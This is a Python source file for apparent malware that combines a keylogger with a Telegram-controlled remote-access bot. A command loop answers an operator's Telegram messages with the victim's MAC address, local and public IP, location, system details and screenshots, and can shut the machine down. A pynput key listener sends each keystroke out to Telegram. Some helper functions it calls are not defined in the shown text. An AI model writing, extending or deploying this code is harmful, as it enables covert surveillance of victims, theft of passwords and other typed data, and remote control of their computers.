# main.py
import os
from pynput.keyboard import Listener
from branch_with_telegram_functions.telegram_functions import check_telegram, send_telegram

def telegram_listener():
    last_update_id = -1
    
    while True:
        command, message_id, last_update_id = check_telegram(last_update_id)
        if command:
            print(f'Received command: {command}')

            command_lower = command.lower()
            if command_lower == '/mac':
                mac_address = get_mac()
                send_telegram(f'MAC Address: {mac_address}')

            elif command_lower == '/local_ip':
                local_ip = GetIP.get_local_ip()
                send_telegram(f'Local IP Address: {local_ip}')

            elif command_lower == '/public_ip':
                public_ip = GetIP.get_public_ip()
                send_telegram(f'Public IP Address: {public_ip}')

            elif command_lower == '/location':
                public_ip = GetIP.get_public_ip()
                location = GetIP.get_location(public_ip)
                send_telegram(f'Location: {location}')

            elif command_lower == '/os':
                system_info = get_system()
                send_telegram(f'System info: {system_info}')

            elif command_lower == '/screenshot':
                send_screenshot()
                send_telegram('Screenshot taken and sent!')

            elif command_lower == '/shutdown':
                send_telegram('Shutting down the system...')
                os.system('shutdown /s /t 1')

def on_press(key):
    try:
        key_str = key.char if hasattr(key, 'char') else str(key)
        send_telegram(key_str)
    except Exception as e:
        print(f'Error logging key: {e}')

def keylogger_listener():
    with Listener(on_press=on_press) as listener:
        listener.join()
